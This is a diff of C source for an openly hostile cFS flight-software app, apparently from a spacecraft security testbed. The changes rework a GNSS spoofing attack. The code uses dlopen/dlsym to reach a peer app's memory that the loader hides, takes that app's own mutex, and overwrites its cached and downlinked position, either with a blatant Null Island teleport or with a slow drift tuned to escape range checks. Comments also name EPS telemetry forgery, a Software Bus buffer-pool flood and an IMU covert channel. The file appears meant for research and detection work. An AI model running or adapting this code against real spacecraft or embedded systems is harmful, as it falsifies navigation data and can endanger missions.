@@ -61,48 +61,35 @@
 #include "cfe_es.h"
 #include "cfe_evs.h"
 #include <string.h>
-#include <stdio.h> /* fopen/fgets - read /proc/self/maps for the GNSS module path */
-#include <math.h> /* fabs - GNSS drift accumulator cap check */
 
 #include "noisy_app_msgids.h"
 #include "generic_eps_msgids.h" /* GENERIC_EPS_HK_TLM_MID (0x091A) - EPS_SPOOF target */
 
+#include <dlfcn.h>            /* dlopen/dlsym - runtime symbol resolution            */
+#include <math.h>             /* fabs - GNSS drift accumulator cap check             */
+
 /*
- * OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT target: the victim GNSS app's own
- * global state.
+ * OPCODE_GNSS_SPOOF/DRIFT target: the victim GNSS app's own global state.
  *
- * Unlike every SB-based scenario above, this one does NOT touch the Software
- * Bus. cFS on this Linux target runs all apps as pthreads in ONE process
- * (os-impl-tasks.c), so they share a single address space with no inter-thread
- * MMU protection. But the POSIX loader honors OS_MODULE_FLAG_LOCAL_SYMBOLS and
- * loads each app .so with RTLD_LOCAL (os-impl-posix-dl-loader.c, and CFE_ES
- * defaults apps to LOCAL_SYMBOLS in cfe_es_apps.c), so the victim's
- * GENERIC_GNSS_AppData symbol is NOT in the global scope: a plain `extern`
- * reference will not link/resolve. We instead resolve it at runtime with
- * dlopen(GNSS_MODULE_SO, RTLD_NOLOAD)+dlsym on the already-resident module
- * handle (RTLD_LOCAL only hides a symbol from *global*-scope resolution, not
- * from dlsym on the module's own handle). See NOISY_ResolveGnssAppData().
- *
- * Once we have the pointer we overwrite the source-of-truth cache
- * (LastBusLat/Lon) that the GNSS HK report recomputes the downlinked
- * DeviceHK.GnssLat/Lon and the InDenmarkBox geofence flag from each cycle, so
+ * Unlike every SB-based scenario, this one does NOT touch the Software Bus. cFS on
+ * Linux runs all apps as pthreads in ONE process (os-impl-tasks.c), so they share a
+ * single address space with no inter-thread MMU protection. The POSIX loader honors
+ * RTLD_LOCAL for apps (os-impl-posix-dl-loader.c), so we cannot `extern`-reference the
+ * GNSS app's global directly; instead we resolve it at runtime with
+ * dlopen(RTLD_NOLOAD)+dlsym (see NOISY_ResolveGnssAppData). We then overwrite the
+ * source-of-truth cache (LastBusLat/Lon/Alt) the GNSS HK report samples each cycle, so
  * the spoofed position propagates into the downlinked packet.
  *
- * This is the point of the PoC: a message-bus mediation layer gates
- * CFE_SB_Subscribe/TransmitMsg and touches no raw memory, so it provides ZERO
- * protection against this write. Including the real header (rather than
- * mirroring the layout as the EPS/IMU scenarios do) keeps the field offsets
- * exactly correct across struct changes; the unused `extern` declaration it
- * carries creates no link dependency because we never name the symbol directly
- * (we go through dlsym). See docs/security/gnss-mem-overwrite-analysis.md.
+ * SB_ACL gates CFE_SB_Subscribe/TransmitMsg only and touches no raw memory, so it
+ * provides ZERO protection against this write. We include the real header for exact
+ * field offsets; the unused `extern` declaration it carries creates no link dependency
+ * because we never name the symbol directly (we go through dlsym).
+ *
+ * On RTEMS the same attack used a plain `extern GENERIC_GNSS_AppData` (static image,
+ * flat global symbol table). The dlsym path here is the Linux/cFS equivalent. See
+ * docs/security/draco-linux-poc.md and docs/security/gnss-mem-overwrite-analysis.md.
  */
-#include "generic_gnss_app.h" /* GENERIC_GNSS_AppData_t layout (resolved via dlsym) */
-#include <dlfcn.h>            /* dlopen/dlsym - runtime cross-app symbol resolution */
-
-/* Victim module file name as loaded by CFE_ES on the Linux target (see
- * fsw/build/exe/cpu1/cf/). dlopen(RTLD_NOLOAD) resolves the already-resident
- * module from the cFS module load path. */
-#define GNSS_MODULE_SO "generic_gnss.so"
+#include "generic_gnss_app.h" /* GENERIC_GNSS_AppData_t layout (resolved via dlsym)   */
 
 /* ---- Carrier (sniffed legitimate command) ------------------------------- */
 #define CARRIER_CMD_MID 0x18E0 /* CI_LAB_CMD_MID (fsw/apps/ci_lab/.../ci_lab_msgids.h) */
@@ -115,8 +102,8 @@
 #define OPCODE_EPS_OVERRIDE 0x06 /* PERSISTENT: shadow every real EPS HK       */
 #define OPCODE_SB_FLOOD     0x08 /* DESTRUCTIVE: lock the whole SB buffer pool */
 #define OPCODE_IMU_BIAS     0x0A /* COVERT CHANNEL: drop an IMU bias spec file  */
-#define OPCODE_GNSS_SPOOF   0x0C /* PERSISTENT: teleport peer GNSS to Null Island*/
-#define OPCODE_GNSS_DRIFT   0x0E /* PERSISTENT: slow plausible GNSS position drift*/
+#define OPCODE_GNSS_SPOOF   0x0C /* PERSISTENT: TELEPORT peer GNSS app to Null Island */
+#define OPCODE_GNSS_DRIFT   0x0E /* PERSISTENT: slow plausible drift of peer GNSS pos  */
 
 /* ---- Scenario tuning ---------------------------------------------------- */
 #define SPOOF_BATTERY_MV 10000 /* < LC WP0 threshold (14800 mV) -> SAFE RTS */
@@ -176,48 +163,40 @@ typedef struct
     float  accel_cap;
 } __attribute__((packed)) NOISY_ImuDrop_t;
 
-/* ---- OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT: direct cross-app memory overwrite *
- * Both modes write the victim GNSS app's cached source-of-truth (LastBusLat/Lon).
- * That cache is the ONLY effective lever: the victim's ReportHousekeeping calls
- * UpdatePositionAndFlags every cycle, which recomputes the downlinked
- * DeviceHK.GnssLat/Lon AND the InDenmarkBox geofence flag *from LastBus** under
- * its HkDataMutex right before TransmitMsg. So poking DeviceHK directly is
- * pointless (overwritten next cycle) and spoofing LastBus* drives the geofence
- *
- * flag for free. Note LastBusAlt is not in the GNSS HK layout, so altitude is
- * never downlinked and we do not bother writing it.
- *
- * TELEPORT (0x0C): Null Island (0,0) - an obviously-wrong, recognizable spoof
- * signature; trivially caught by a range/sanity check. Good for the obvious demo.
- * DRIFT (0x0E): genuine position + a slowly-growing offset - stays plausible and
- * orbit-shaped, so only a cross-source truth-vs-bus check (not a range check)
- * catches it. See docs/security/gnss-mem-overwrite-analysis.md. */
-#define GNSS_SPOOF_LAT 0.0 /* deg WGS84 (TELEPORT target) */
-#define GNSS_SPOOF_LON 0.0 /* deg WGS84 (TELEPORT target) */
-/* DRIFT tunables: per-step offset increment and absolute cap on the accumulated
- * offset. The offset advances only on a fresh genuine sim sample (see the
- * anti-compounding guard in NOISY_GnssShadowTask), which the BusRx child task
- * produces at ~1 Hz, so the step is effectively deg/s. At 0.02 deg/s the bus
- * position walks ~1.2 deg/min off truth: clearly visible against ground truth
- * within ~15-20 s, ~1.2 deg apart by 60 s, while still looking orbit-shaped.
- * The cap (3.0 deg, ~2.5 min before clamping) bounds runaway growth. Lower the
- * step back toward 0.0002 to restore the original stealthy ~0.012 deg/min walk.
- * NOTE: a large drift will eventually push the believed position out of the
- * Denmark box, flipping InDenmarkBox -> SAFE; that is fine for the detection
- * chart because GENERIC_GNSS_HK_TLM_MID (0x0952) is in the SAFE beacon set
- * (to_lab_sub.c), so the bus value keeps downlinking. */
-#define GNSS_DRIFT_LAT_STEP 0.02   /* deg added per fresh genuine sample (~1 Hz) */
-#define GNSS_DRIFT_LON_STEP 0.02   /* deg added per fresh genuine sample (~1 Hz) */
-#define GNSS_DRIFT_LAT_CAP  3.0    /* deg, max accumulated lat offset */
-#define GNSS_DRIFT_LON_CAP  3.0    /* deg, max accumulated lon offset */
-/* The GNSS BusRx child task rewrites LastBus* from the sim UART line at ~1 Hz,
- * so a single shadow write is clobbered until we re-apply it. Shadowing at
- * 20 ms (vs the 1 Hz HK report) shrinks the window in which the HK report can
- * sample an un-spoofed value to ~2%, removing the visible up/down jitter the
- * old 100 ms period produced. This only controls jitter: the drift growth rate
- * is gated to ~1 fresh sample/s by the anti-compounding guard, independent of
- * this period. See docs/security/gnss-mem-overwrite-analysis.md. */
+/* ---- OPCODE_GNSS_SPOOF/DRIFT: direct cross-app memory overwrite ---------- *
+ * Spoof coordinates written into the victim GNSS app's cached source-of-truth.
+ * Null Island (0,0) is an obviously-wrong, recognizable GPS-spoof signature;
+ * it also drops the spacecraft out of the GNSS app's Denmark geofence box. */
+#define GNSS_SPOOF_LAT   0.0   /* deg WGS84 */
+#define GNSS_SPOOF_LON   0.0   /* deg WGS84 */
+#define GNSS_SPOOF_ALT   0.0   /* m WGS84 ellipsoid */
+/* The GNSS BusRx child task rewrites LastBus* from the sim line every tick, so a single
+ * write is clobbered. Shadow it faster than the sim refresh so the HK report
+ * predominantly samples our value. Expect some oscillation between spoofed and genuine
+ * samples; that residual is itself a detection artifact. */
 #define GNSS_SHADOW_PERIOD_MS 20
+/* Victim module file name as loaded by CFE_ES on the Linux target. OSAL loads app
+ * modules with a CWD-relative path ("cf/<app>.so") from the FSW working dir
+ * (fsw/build/exe/cpu1), so glibc keys the loaded object under that resolved absolute
+ * path. dlopen(RTLD_NOLOAD) only returns the existing handle when the name resolves to
+ * the SAME file - a bare "generic_gnss.so" is searched on the default lib path (which
+ * excludes cf/) and fails, and the cFS virtual "/cf/..." path does not exist on the real
+ * filesystem. We therefore try the CWD-relative path first. GNSS_MODULE_SO is the label
+ * used in the failure EVS event. */
+#define GNSS_MODULE_SO   "cf/generic_gnss.so"
+
+/* OPCODE_GNSS_DRIFT tuning: track the GENUINE position plus a slowly growing offset
+ * (orbit-plausible) rather than a fixed teleport, so only a truth-vs-bus cross-source
+ * comparison (not a range check) catches it. EDUCATION-tuned to be FAST (matches the
+ * RTEMS testbed): the offset advances one STEP per fresh genuine sample (the GNSS HK
+ * arrives at ~1 Hz, so the step is effectively deg/s). At 0.02 deg/s the bus position
+ * walks ~1.2 deg/min off truth - clearly visible against ground truth within ~15-20 s,
+ * ~1.2 deg apart by 60 s, clamped at 3.0 deg (~2.5 min). Lower the step back toward
+ * 0.0002 to restore the original stealthy ~0.012 deg/min walk. */
+#define GNSS_DRIFT_LAT_STEP 0.02   /* deg added per fresh genuine sample (~1 Hz) */
+#define GNSS_DRIFT_LON_STEP 0.02
+#define GNSS_DRIFT_LAT_CAP  3.0    /* deg, max accumulated lat offset */
+#define GNSS_DRIFT_LON_CAP  3.0
 
 /* ---- EVS event IDs ------------------------------------------------------ */
 #define NOISY_EVT_INIT      1
@@ -227,7 +206,7 @@ typedef struct
 #define NOISY_EVT_UNKNOWN    5
 #define NOISY_EVT_OVERRIDE   6
 #define NOISY_EVT_POOLLOCK   7
-#define NOISY_EVT_GNSS_SPOOF 8
+#define NOISY_EVT_GNSS_SPOOF 8 /* GNSS direct-memory spoof/drift engaged/cleared/error */
 #define NOISY_EVT_PIPEFLOOD  9
 
 /*
@@ -258,20 +237,11 @@ typedef struct
     } Switch[8];
 } __attribute__((packed)) NOISY_EpsHkMimic_t;
 
-/* GNSS overwrite mode for the shared shadow task. Read in the task's loop and
- * written from the main loop, so volatile (no register-cached stale read that
- * would make opcode 0x00 fail to stop the spoof). */
-typedef enum
-{
-    GNSS_MODE_NONE = 0, /* idle: shadow task exits */
-    GNSS_MODE_TELEPORT, /* OPCODE_GNSS_SPOOF: write Null Island (0,0)    */
-    GNSS_MODE_DRIFT     /* OPCODE_GNSS_DRIFT: genuine + growing offset   */
-} NOISY_GnssMode_t;
-
 static uint32                    NOISY_TriggerCount = 0;
 static bool                      NOISY_OverrideOn   = false;          /* OPCODE_EPS_OVERRIDE engaged? */
-static volatile NOISY_GnssMode_t NOISY_GnssMode     = GNSS_MODE_NONE; /* active GNSS mode */
-static volatile bool             NOISY_GnssTaskUp   = false;          /* shadow child task created once */
+static bool                      NOISY_GnssSpoofOn  = false;          /* OPCODE_GNSS_SPOOF/DRIFT engaged? */
+static bool                      NOISY_GnssTaskUp   = false;          /* shadow child task created once  */
+static uint8                     NOISY_GnssMode     = OPCODE_GNSS_SPOOF; /* TELEPORT or DRIFT            */
 
 /* Forge and transmit ONE EPS housekeeping packet with a chosen battery value.
  * Consumers (LC, ELK) see it as a normal GENERIC_EPS_HK_TLM. Silent: the caller
@@ -498,15 +468,14 @@ static void NOISY_SbPoolLock(void)
         return;
     }
 
-    /* The subscribe is SB_ACL-gated. If it is denied (ENFORCE), there is no
-     * subscriber to retain the parked buffers, so the flood cannot arm: report
-     * the block honestly, release the pipe, and bail - do NOT emit the CRITICAL
-     * "engaged" event or run the transmit loop (it would silently no-op). */
+    /* If the subscribe fails there is no subscriber to retain the parked
+     * buffers, so the flood cannot arm: report it, release the pipe, and bail -
+     * do NOT emit the CRITICAL "engaged" event or run the transmit loop (it
+     * would silently no-op). */
     if (CFE_SB_SubscribeEx(CFE_SB_ValueToMsgId(LOCK_MID), sink, CFE_SB_DEFAULT_QOS, LOCK_MSGLIM) != CFE_SUCCESS)
     {
         CFE_EVS_SendEvent(NOISY_EVT_POOLLOCK, CFE_EVS_EventType_INFORMATION,
-                          "NOISY_APP: SB pool lock ABORTED - subscribe to LOCK_MID 0x%04X denied "
-                          "by policy (SB_ACL ENFORCE).",
+                          "NOISY_APP: SB pool lock ABORTED - subscribe to LOCK_MID 0x%04X failed.",
                           (unsigned int)LOCK_MID);
         CFE_SB_DeletePipe(sink);
         return;
@@ -607,148 +576,105 @@ static void NOISY_WriteImuDeadDrop(void)
     }
 }
 
-/* OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT shadow task - the direct cross-app
- * memory overwrite.
+/* Resolve the victim GNSS app's AppData global in our shared address space.
  *
- * Loops while NOISY_GnssMode != NONE, writing the peer GNSS app's source-of-truth
- * cache (LastBus*) through a pointer resolved at runtime via dlopen+dlsym (see
- * NOISY_ResolveGnssAppData - the victim .so is RTLD_LOCAL so a plain `extern`
- * cannot reach it on this Linux target). We write ONLY LastBus*: the victim's
- * ReportHousekeeping recomputes the downlinked DeviceHK.GnssLat/Lon and the
- * InDenmarkBox geofence flag from LastBus* every cycle under the same mutex, so
- * LastBus* is the sole effective lever and the geofence flag follows for free
- * (writing DeviceHK directly would just be overwritten the next cycle).
- * LastBusAlt is not in the HK layout, so we skip it.
- *
- * Writes are taken under the victim's OWN HkDataMutex - we have its osal_id_t
- * straight out of its global struct, so we serialize cleanly against its
- * BusRx/HK tasks. This is never on the Software Bus, so a bus-mediation layer
- * cannot see or block it.
- *
- * DRIFT mode is anti-compounding: each cycle reads the current LastBusLat/Lon,
- * and only advances the offset accumulator when the victim's BusRx child task
- * has refreshed the cache (genuine != our last write). It then writes
- * genuine + accumulated_offset, so the result tracks the real orbit shape with a
- * slowly growing, plausible offset instead of runaway compounding. */
+ * The module is loaded RTLD_LOCAL, so its symbol is not in global scope and neither a
+ * link-time `extern` nor OS_SymbolLookup (dlsym on RTLD_DEFAULT) can find it. But the
+ * module IS resident: dlopen with RTLD_NOLOAD returns a handle to the already-loaded
+ * library without reloading it, and dlsym on THAT handle returns the symbol address
+ * despite RTLD_LOCAL. One process, no MMU boundary between threads -> the pointer is
+ * directly writable. Result is cached; the single extra dlopen refcount is never
+ * balanced because the module never unloads during the mission (intentional). */
 static GENERIC_GNSS_AppData_t *NOISY_ResolveGnssAppData(void)
 {
     static GENERIC_GNSS_AppData_t *cached = NULL;
-    void                          *handle = NULL;
+    /* Candidate names for the already-loaded module. The CWD-relative "cf/..." is how
+     * OSAL loads it on this target; the bare and "./" forms are belt-and-suspenders for
+     * other layouts. Each must resolve (by realpath/inode) to the loaded object for
+     * RTLD_NOLOAD to hand back its handle. */
+    static const char *candidates[] = {
+        "cf/generic_gnss.so",
+        "./cf/generic_gnss.so",
+        "generic_gnss.so",
+    };
+    size_t i;
 
     if (cached != NULL)
     {
         return cached;
     }
 
-    /* The module is loaded RTLD_LOCAL, so its global GENERIC_GNSS_AppData is not
-     * in the process-global scope (dlsym(RTLD_DEFAULT) cannot see it). dlopen with
-     * RTLD_NOLOAD returns a handle to the already-resident module ONLY if we name
-     * it the way the loader recorded it - matching is by recorded name string and
-     * by st_dev/st_ino. On this 9p devcontainer bind-mount the synthetic inodes
-     * make the stat/inode fallback unreliable, and CFE_ES records the module under
-     * its full ABSOLUTE path, so a cwd-relative name does not string-match either.
-     * Robust fix: read the EXACT path string the loader is using straight out of
-     * /proc/self/maps and dlopen that, so the name comparison hits. */
+    for (i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++)
     {
-        FILE *maps = fopen("/proc/self/maps", "r");
-        if (maps != NULL)
+        void *handle = dlopen(candidates[i], RTLD_NOW | RTLD_NOLOAD);
+        if (handle != NULL)
         {
-            char line[512];
-            while (handle == NULL && fgets(line, sizeof(line), maps) != NULL)
+            cached = (GENERIC_GNSS_AppData_t *)dlsym(handle, "GENERIC_GNSS_AppData");
+            if (cached != NULL)
             {
-                if (strstr(line, GNSS_MODULE_SO) != NULL)
-                {
-                    /* maps columns: addr perms offset dev inode pathname; the
-                     * pathname is the only field containing '/'. */
-                    char *path = strchr(line, '/');
-                    if (path != NULL)
-                    {
-                        size_t n = strlen(path);
-                        if (n > 0 && path[n - 1] == '\n')
-                        {
-                            path[n - 1] = '\0';
-                        }
-                        /* Plain dlopen (NO RTLD_NOLOAD) of the EXACT path the loader
-                         * recorded. glibc dedups loaded libraries by resolved path, so
-                         * this returns the SAME already-resident link_map (refcount++),
-                         * never a second copy - giving us the live GENERIC_GNSS_AppData.
-                         * RTLD_NOLOAD was observed NOT to match these cFS modules on the
-                         * glibc/9p devcontainer (synthetic inodes), so we avoid it here. */
-                        handle = dlopen(path, RTLD_NOW);
-                    }
-                }
+                return cached;
             }
-            fclose(maps);
         }
     }
-
-    /* Fallback: cwd-relative / bare-name candidates (covers a loader that recorded
-     * a relative path, or /proc being unavailable). */
-    if (handle == NULL)
-    {
-        static const char *candidates[] = {"cf/" GNSS_MODULE_SO, "./cf/" GNSS_MODULE_SO, GNSS_MODULE_SO, NULL};
-        int                ci;
-        for (ci = 0; candidates[ci] != NULL && handle == NULL; ci++)
-        {
-            handle = dlopen(candidates[ci], RTLD_NOW | RTLD_NOLOAD);
-        }
-    }
-
-    if (handle == NULL)
-    {
-        return NULL; /* GNSS app not loaded (yet) */
-    }
-
-    cached = (GENERIC_GNSS_AppData_t *)dlsym(handle, "GENERIC_GNSS_AppData");
-    return cached;
+    return NULL; /* GNSS app not loaded, or symbol not exported */
 }
 
+/* OPCODE_GNSS_SPOOF/DRIFT shadow task - the direct cross-app memory overwrite.
+ * Loops while NOISY_GnssSpoofOn, writing the spoof location into the peer GNSS app's
+ * globals (source cache + in-flight HK packet) under the victim's own HkDataMutex.
+ * Never on the Software Bus, so SB_ACL cannot see or block it.
+ *
+ * TELEPORT (OPCODE_GNSS_SPOOF): clamp the cache to Null Island every cycle.
+ * DRIFT (OPCODE_GNSS_DRIFT): anti-compounding per-axis offset. Each cycle reads the
+ * current LastBus*, and advances the offset accumulators by one STEP only when the
+ * victim's BusRx child task has refreshed the cache (genuine != our last write). It
+ * then writes genuine + accumulated_offset, so the result tracks the real orbit shape
+ * with a growing, capped, plausible offset instead of runaway compounding. */
 static void NOISY_GnssShadowTask(void)
 {
     GENERIC_GNSS_AppData_t *gnss = NOISY_ResolveGnssAppData();
-    double drift_lat        = 0.0;
-    double drift_lon        = 0.0;
-    double last_written_lat = 0.0;
-    double last_written_lon = 0.0;
-    bool   have_last        = false;
+    double                  drift_lat         = 0.0;
+    double                  drift_lon         = 0.0;
+    double                  last_genuine_lat  = 0.0; /* latched true position; held between fresh samples */
+    double                  last_genuine_lon  = 0.0;
+    double                  last_written_lat  = 0.0;
+    double                  last_written_lon  = 0.0;
+    bool                    have_last         = false;
 
     if (gnss == NULL)
     {
         CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_ERROR,
                           "NOISY_APP: GNSS spoof could not resolve %s:GENERIC_GNSS_AppData.",
                           GNSS_MODULE_SO);
-        NOISY_GnssMode   = GNSS_MODE_NONE;
-        NOISY_GnssTaskUp = false;
+        NOISY_GnssSpoofOn = false;
+        NOISY_GnssTaskUp  = false;
         return;
     }
 
-    while (NOISY_GnssMode != GNSS_MODE_NONE)
+    while (NOISY_GnssSpoofOn)
     {
-        /* If GNSS is not (yet) initialized its mutex id is undefined; do not take
-         * an invalid id. Wait and retry so we self-heal if GNSS comes up later. */
-        if (!OS_ObjectIdDefined(gnss->HkDataMutex))
-        {
-            OS_TaskDelay(GNSS_SHADOW_PERIOD_MS);
-            continue;
-        }
-
         if (OS_MutSemTake(gnss->HkDataMutex) == OS_SUCCESS)
         {
-            if (NOISY_GnssMode == GNSS_MODE_TELEPORT)
-            {
-                gnss->LastBusLat = GNSS_SPOOF_LAT;
-                gnss->LastBusLon = GNSS_SPOOF_LON;
-            }
-            else /* GNSS_MODE_DRIFT */
+            if (NOISY_GnssMode == OPCODE_GNSS_DRIFT)
             {
                 double genuine_lat = gnss->LastBusLat;
                 double genuine_lon = gnss->LastBusLon;
 
-                /* Advance the offset only on a fresh genuine sample (BusRx wrote
-                 * a value we did not). Exact != is safe: we wrote exactly
-                 * last_written_*, and a parsed sim sample will not be bit-equal. */
+                /* A fresh genuine sample is one the victim's BusRx wrote (not our
+                 * own last spoofed write). Exact != is safe: we wrote exactly
+                 * last_written_*, and a parsed sim sample will not be bit-equal.
+                 * On a fresh sample, LATCH the genuine baseline and advance the
+                 * offset by one step. Between samples we hold last_genuine_* and
+                 * re-write last_genuine + offset. We must NOT use the just-read
+                 * LastBusLat as "genuine" between samples: that is our own spoofed
+                 * write, so adding the offset to it again every shadow tick (~50x
+                 * per 1 Hz sample at the 20 ms period) compounds into a ~1 deg/s
+                 * runaway instead of the intended 0.02 deg/s. See debug/journal.md
+                 * 2026-06-10. */
                 if (!have_last || genuine_lat != last_written_lat || genuine_lon != last_written_lon)
                 {
+                    last_genuine_lat = genuine_lat;
+                    last_genuine_lon = genuine_lon;
                     if (fabs(drift_lat) < GNSS_DRIFT_LAT_CAP)
                     {
                         drift_lat += GNSS_DRIFT_LAT_STEP;
@@ -757,13 +683,23 @@ static void NOISY_GnssShadowTask(void)
                     {
                         drift_lon += GNSS_DRIFT_LON_STEP;
                     }
+                    have_last = true;
                 }
 
-                gnss->LastBusLat = genuine_lat + drift_lat;
-                gnss->LastBusLon = genuine_lon + drift_lon;
-                last_written_lat = gnss->LastBusLat;
-                last_written_lon = gnss->LastBusLon;
-                have_last        = true;
+                gnss->LastBusLat                      = last_genuine_lat + drift_lat;
+                gnss->LastBusLon                      = last_genuine_lon + drift_lon;
+                gnss->HkTelemetryPkt.DeviceHK.GnssLat = gnss->LastBusLat;
+                gnss->HkTelemetryPkt.DeviceHK.GnssLon = gnss->LastBusLon;
+                last_written_lat                      = gnss->LastBusLat;
+                last_written_lon                      = gnss->LastBusLon;
+            }
+            else /* OPCODE_GNSS_SPOOF: TELEPORT */
+            {
+                gnss->LastBusLat                      = GNSS_SPOOF_LAT;
+                gnss->LastBusLon                      = GNSS_SPOOF_LON;
+                gnss->LastBusAlt                      = GNSS_SPOOF_ALT;
+                gnss->HkTelemetryPkt.DeviceHK.GnssLat = GNSS_SPOOF_LAT;
+                gnss->HkTelemetryPkt.DeviceHK.GnssLon = GNSS_SPOOF_LON;
             }
             OS_MutSemGive(gnss->HkDataMutex);
         }
@@ -772,42 +708,40 @@ static void NOISY_GnssShadowTask(void)
     NOISY_GnssTaskUp = false; /* task exits when spoof cleared; allow re-arm */
 }
 
-/* OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT - engage a persistent GNSS position
- * overwrite in the requested mode. Spawns the shadow task once; re-arming (even
- * into a different mode) reuses the live task by flipping NOISY_GnssMode, and the
- * task's local drift accumulators reset whenever it is (re)created. */
-static void NOISY_StartGnssSpoof(NOISY_GnssMode_t mode)
+/* OPCODE_GNSS_SPOOF/DRIFT - engage the persistent GNSS position overwrite. */
+static void NOISY_StartGnssSpoof(uint8 mode)
 {
-    NOISY_GnssMode = mode;
+    NOISY_GnssMode    = mode;
+    NOISY_GnssSpoofOn = true;
 
     if (!NOISY_GnssTaskUp)
     {
         CFE_ES_TaskId_t tid = CFE_ES_TASKID_UNDEFINED;
-        if (CFE_ES_CreateChildTask(&tid, "NOISY_GNSS_SHADOW", NOISY_GnssShadowTask, CFE_ES_TASK_STACK_ALLOCATE, 4096,
-                                   120, 0) == CFE_SUCCESS)
+        if (CFE_ES_CreateChildTask(&tid, "NOISY_GNSS_SHADOW", NOISY_GnssShadowTask,
+                                   CFE_ES_TASK_STACK_ALLOCATE, 8192, 120, 0) == CFE_SUCCESS)
         {
             NOISY_GnssTaskUp = true;
         }
         else
         {
-            NOISY_GnssMode = GNSS_MODE_NONE; /* could not arm */
+            NOISY_GnssSpoofOn = false; /* could not arm */
             return;
         }
     }
 
-    if (mode == GNSS_MODE_TELEPORT)
+    if (mode == OPCODE_GNSS_DRIFT)
     {
         CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
-                          "NOISY_APP: GNSS position TELEPORT ENGAGED via direct memory write "
-                          "(lat=%.4f lon=%.4f). Send opcode 0x00 to clear.",
-                          (double)GNSS_SPOOF_LAT, (double)GNSS_SPOOF_LON);
+                          "NOISY_APP: GNSS position DRIFT ENGAGED via direct memory write "
+                          "(step=%.4f deg/sample cap=%.2f deg). Send opcode 0x00 to clear.",
+                          (double)GNSS_DRIFT_LAT_STEP, (double)GNSS_DRIFT_LAT_CAP);
     }
     else
     {
         CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
-                          "NOISY_APP: GNSS position DRIFT ENGAGED via direct memory write "
-                          "(step=%.4f deg/cycle cap=%.2f deg). Send opcode 0x00 to clear.",
-                          (double)GNSS_DRIFT_LAT_STEP, (double)GNSS_DRIFT_LAT_CAP);
+                          "NOISY_APP: GNSS position SPOOF (Null Island) ENGAGED via direct "
+                          "memory write (lat=%.4f lon=%.4f). Send opcode 0x00 to clear.",
+                          (double)GNSS_SPOOF_LAT, (double)GNSS_SPOOF_LON);
     }
 }
 
@@ -817,19 +751,18 @@ static void NOISY_APP_RunScenario(uint8 opcode)
     switch (opcode)
     {
         case OPCODE_DORMANT:
-            /* stealth: act on nothing; also stop a running EPS override. */
+            /* stealth: act on nothing; also stop a running EPS override or GNSS spoof. */
             if (NOISY_OverrideOn)
             {
                 NOISY_OverrideOn = false;
                 CFE_EVS_SendEvent(NOISY_EVT_OVERRIDE, CFE_EVS_EventType_INFORMATION,
                                   "NOISY_APP: EPS override CLEARED.");
             }
-            /* ...and stop a running GNSS spoof/drift (the shadow task self-exits). */
-            if (NOISY_GnssMode != GNSS_MODE_NONE)
+            if (NOISY_GnssSpoofOn)
             {
-                NOISY_GnssMode = GNSS_MODE_NONE;
+                NOISY_GnssSpoofOn = false;
                 CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
-                                  "NOISY_APP: GNSS position overwrite CLEARED.");
+                                  "NOISY_APP: GNSS position SPOOF CLEARED.");
             }
             break;
 
@@ -859,15 +792,15 @@ static void NOISY_APP_RunScenario(uint8 opcode)
             break;
 
         case OPCODE_GNSS_SPOOF:
-            /* Persistent: directly overwrite the peer GNSS app's cached position
-             * with a blatant teleport (no Software Bus, so SB_ACL cannot block it). */
-            NOISY_StartGnssSpoof(GNSS_MODE_TELEPORT);
+            /* Persistent: directly overwrite the peer GNSS app's cached position in
+             * memory (no Software Bus, so SB_ACL cannot block it). TELEPORT to 0,0. */
+            NOISY_StartGnssSpoof(OPCODE_GNSS_SPOOF);
             break;
 
         case OPCODE_GNSS_DRIFT:
-            /* Persistent: same direct-memory vector, but a slow plausible drift
-             * (genuine + growing offset) that a range check will not catch. */
-            NOISY_StartGnssSpoof(GNSS_MODE_DRIFT);
+            /* Persistent: same direct-memory vector, but a slow orbit-plausible drift
+             * that only a truth-vs-bus comparison catches. */
+            NOISY_StartGnssSpoof(OPCODE_GNSS_DRIFT);
             break;
 
         default:
